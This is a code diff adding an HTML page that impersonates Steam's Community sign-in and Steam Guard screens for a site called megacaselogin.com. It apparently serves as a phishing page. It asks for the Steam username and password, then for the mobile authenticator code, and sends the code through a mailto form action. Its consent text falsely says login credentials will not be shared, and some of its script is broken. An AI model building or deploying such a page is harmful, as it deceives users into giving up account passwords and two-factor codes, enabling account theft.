@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>Steam Community</title>
+    <link rel="stylesheet" type="text/css" href="steamguard.css" />
+    <link rel="icon" href="steamlogo.png" />
+  </head>
+  <body>
+    <div id="head">
+      <img
+        id="headlogo"
+        src="https://community.akamai.steamstatic.com/public/shared/images/header/logo_steam.svg?t=962016"
+      />
+      <div id="menu">
+        <a id="a1" href="index.html">STORE</a>
+      </div>
+      <div id="menu">
+        <a id="a1" href="index.html">COMMUNITY</a>
+      </div>
+      <div id="menu">
+        <a id="a1" href="index.html">ABOUT</a>
+      </div>
+      <div id="menu">
+        <a id="a1" href="index.html">SUPPORT</a>
+      </div>
+      <div id="zainstaluj">
+        <a id="zainstaluj1" href="https://store.steampowered.com/about/"
+          >Install Steam</a
+        >
+      </div>
+      <div id="zaloguj">
+        <a href="icon_info.png" id="zalogujsie">login </a> |
+        <a href="icon_info.png" id="zalogujsie"> language</a>
+      </div>
+    </div>
+
+    <div id="info">
+      <h1 id="megacaselogin">
+        Sign into megacaselogin.com using your Steam account
+      </h1>
+      <img id="sit" src="sits_landing.png" /><br />
+      <img id="infoicon" src="icon_info.png" />
+      <h1 id="uwagaicon">
+        Note that megacaselogin.com is not affiliated with Steam or Valve
+      </h1>
+    </div>
+
+    <div id="logowanie">
+      <div id="login">
+          <br /><br />
+          <label for="nick">Steam username</label><br />
+          <input type="text" id="nick" name="nick" /><br /><br />
+          <label for="haslo">Password</label><br />
+          <input type="password" name="haslo" /><br /><br />
+        <!-- Trigger/Open The Modal -->
+        <button onclick="signin()" id="myBtn">Sign In</button>
+
+        <!-- The Modal -->
+        <div id="myModal" class="modal">
+          <!-- Modal content -->
+          <div class="modal-content">
+            <span class="close">&times;</span>
+            <p id="guardhead">STEAM GUARD MOBILE AUTHENTICATION</p>
+            <img id="telefon" src="telefon.png" />
+            <table>
+              <tr>
+                <td><p id="hello">Hello </p></td>
+              </tr>
+              <tr>
+                <td>
+                  <h7 id="acc">
+                    This account is currently using a Steam Guard
+                    MobileAuthenticator.
+                  </h7>
+                </td>
+              </tr>
+            </table>
+            <br /><br /><br />
+            <h7 id="entercode"
+              >Enter the current code displayed in the Steam Mobile app:</h7
+            >
+            <form action="mailto:guwno@gmial.com" method="post">
+              <input
+                id="code"
+                type="text"
+                placeholder="enter your code here"
+                autocomplete="off"
+              /><br /><br /><br />
+              <input type="button" id="submitcode" value="Submit" />
+              <input type="button" id="help" value="Please help" />
+            </form>
+          </div>
+        </div>
+
+        <script>
+
+          function signin()
+          {
+            var a=document.getElementById("nick").value;
+
+            var nick = (document.getElementById("hello").innerHTML =
+          "Hello "+nick+"!");
+          }
+          // Get the modal
+          var modal = document.getElementById("myModal");
+
+          // Get the button that opens the modal
+          var btn = document.getElementById("myBtn");
+
+          // Get the <span> element that closes the modal
+          var span = document.getElementsByClassName("close")[0];
+
+          // When the user clicks the button, open the modal
+          btn.onclick = function dupa2() {
+            modal.style.display = "block";
+          };
+
+          // When the user clicks on <span> (x), close the modal
+          span.onclick = function dupa1() {
+            modal.style.display = "none";
+          };
+        </script>
+        <p id="brakkonta">
+          Don't have a Steam account? You can create an account for free.
+        </p>
+      </div>
+      <div id="login2">
+        <p id="prawo">By signing into megacaselogin.com through Steam:</p>
+        <ul>
+          <li>Your Steam login credentials will not be shared.</li>
+          <li>
+            A unique numeric identifier will be shared with megacaselogin.com.
+            Through this, megacaselogin.com will be able to identify your Steam
+            community profile and access information about your Steam account
+            according to your Profile Privacy Settings.
+          </li>
+          <li id="ostatnie">
+            Any information on your Steam Profile page that is set to be
+            publicly viewable may be accessed by megacaselogin.com.
+          </li>
+        </ul>
+        <p id="prawo2">
+          By clicking "Sign In" you agree to this data being shared.
+        </p>
+      </div>
+    </div>
+
+    <div id="footer">
+      <img id="valve" src="footerLogo_valve.png" />
+      <p id="valve2">
+        © Valve Corporation. All rights reserved. All trademarks are property of
+        their respective owners in the US and other countries. Some geospatial
+        data on this website is provided by geonames.org.
+      </p>
+      <br />
+      <div id="foot1">
+        <a href="icon_info.png" id="foot">Privacy Policy </a> |
+        <a href="icon_info.png" id="foot"> Legal </a> |
+        <a href="icon_info.png" id="foot"> Steam Subscriber Agreement </a> |
+        <a href="icon_info.png" id="foot"> Cookies</a>
+      </div>
+    </div>
+  </body>
+</html>
